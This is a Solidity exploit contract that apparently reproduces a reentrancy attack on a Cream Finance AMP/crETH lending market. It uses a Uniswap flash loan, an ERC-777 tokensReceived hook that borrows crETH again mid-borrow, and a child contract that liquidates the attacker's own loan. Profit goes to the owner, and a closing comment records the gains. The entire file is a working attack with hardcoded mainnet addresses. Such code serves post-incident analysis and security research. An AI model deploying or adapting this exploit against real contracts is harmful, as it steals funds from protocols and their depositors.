// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;

import "hardhat/console.sol";
import { ERC1820Registry, IAmpTokensRecipient, IERC20 } from "./AMPToken.sol";
import { IUniswapV2Factory, IUniswapV2Callee, IUniswapV2Pair } from "./IUniswap.sol";
import { CTokenInterface, CErc20Interface } from "./CTokenInterfaces.sol";

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface CRETH {
    function mint() external payable;
    function borrow(uint borrowAmount) external returns (uint);
    function redeem(uint redeemTokens) external returns (uint);
}

interface ComptrollerInterface {
    function enterMarkets(address[] calldata cTokens) external returns (uint[] memory);
    function exitMarket(address cToken) external returns (uint);
}

// Liquidates part of the attackers AMP loan to get his collateral ETH
contract AttackChild {

    fallback () payable external {}

    function execute(address receiver) public {

        address crAmp = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6;
        address crEth = 0xD06527D5e56A3495252A528C4987003b712860eE;
        address ampToken = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;
        address wethAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

        uint256 balance = IERC20(ampToken).balanceOf(address(this));
        IERC20(ampToken).approve(crAmp, uint256(-1));
        // Liquidate half of the AMP loan of `receiver` to gain his collateral ETH
        CErc20Interface(crAmp).liquidateBorrow(receiver, balance, CTokenInterface(crEth));
        balance = IERC20(crEth).balanceOf(address(this));
        // Redeem crETH gained to ETH and send to the attacker (`receiver`)
        CRETH(crEth).redeem(balance);
        IWETH(wethAddr).deposit{value : address(this).balance}();
        balance = IERC20(wethAddr).balanceOf(address(this));
        IERC20(wethAddr).transfer(receiver, balance);
    }
}

contract Attack {
    // Registry required to register our ERC-777 transfer hooks for the reentrancy
    ERC1820Registry reg = ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    address wethAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address ampToken = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;
    address crAmp = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6;
    address crEth = 0xD06527D5e56A3495252A528C4987003b712860eE;
    address uniWiseEthPair = 0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E;
    address owner;

    uint256 _ampToBorrow = 19480000 * 1e18;
    uint256 _crEthToBorrowReentr = 355 * 1e18;

    constructor () public {
        owner = msg.sender;
    }

    fallback () payable external {}

    // ERC-777 postTransfer hook
    function canReceive(bytes4, bytes32, address, address, address, uint256, bytes calldata, bytes calldata) external view returns (bool) {
        return true;
    }

    // ERC-777 hook executed upon a transfer to the recipient
    // This is where Reentrancy is exploited
    function tokensReceived(bytes4, bytes32, address, address, address, uint256, bytes calldata, bytes calldata) external {
        uint256 borrowAmount = _crEthToBorrowReentr;
        CRETH(crEth).borrow(borrowAmount);  // Borrow crETH against the deposited crETH
    }

    // Called after the uniswap flash loan is received
    function uniswapV2Call(address, uint amount0, uint amount1, bytes calldata) external {

        uint256 wethBorrowed = (amount0 == 0) ? amount1 : amount0;
        IWETH(wethAddr).approve(crAmp, uint256(-1));  // ?? Needed
        IWETH(wethAddr).withdraw(wethBorrowed);
        CRETH(crEth).mint{value: address(this).balance}();  // Mint crETH

        address comptroller = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;
        address[] memory ctokens = new address[](1);
        ctokens[0] = crEth;
        ComptrollerInterface(comptroller).enterMarkets(ctokens);

        // Borrow AMP against crETH
        uint256 ampToBorrow = _ampToBorrow;
        CErc20Interface(crAmp).borrow(ampToBorrow);  // !! Reentrancy here

        // Liquidate part of the AMP loan to gain and redeem crETH
        AttackChild attackChild = new AttackChild();
        uint256 ampToSend = ampToBorrow / 2;
        IERC20(ampToken).transfer(address(attackChild), ampToSend);
        attackChild.execute(address(this));

        IWETH(wethAddr).deposit{value : address(this).balance}();
        // Repay flash loan of 500 WETH
        uint256 wethToReturn = wethBorrowed * 1000 / 997 + 1;
        IERC20(wethAddr).transfer(uniWiseEthPair, wethToReturn);
    }

    function exploit() public {
        // Register the transfer hooks
        bytes32 interfaceHash = keccak256(abi.encodePacked("AmpTokensRecipient")); // ??
        reg.setInterfaceImplementer(address(this), interfaceHash, address(this));

        // Flash loan 500 WETH
        uint256 wethLoanAmount = 500 * 1e18;
        bytes memory data = "0";
        IUniswapV2Pair(uniWiseEthPair).swap(0, wethLoanAmount, address(this), data);
    
        sendProfitToOwner();
    }

    function sendProfitToOwner() public {
        uint256 balance = IERC20(wethAddr).balanceOf(address(this));
        IERC20(wethAddr).transfer(owner, balance);
        balance = IERC20(ampToken).balanceOf(address(this));
        IERC20(ampToken).transfer(owner, balance);
    }

    function checkBalance(address addr) public view {
        console.log("-----------------------");
        uint256 balance = IERC20(ampToken).balanceOf(addr);
        console.log("[%s] AMP Balance is: ", addr, balance);
        balance = IERC20(wethAddr).balanceOf(addr);
        console.log("[%s] WETH Balance is: ", addr, balance);
        // balance = IERC20(crEth).balanceOf(addr);
        // console.log("[ATK] crETH Balance is: ", balance);
        // balance = IERC20(crAmp).balanceOf(addr);
        // console.log("[ATK] crAMP Balance is: ", balance);
    }
}

// -- Profit
// ETH: 37,226346333275008764
// AMP: 9740000,000000000000000000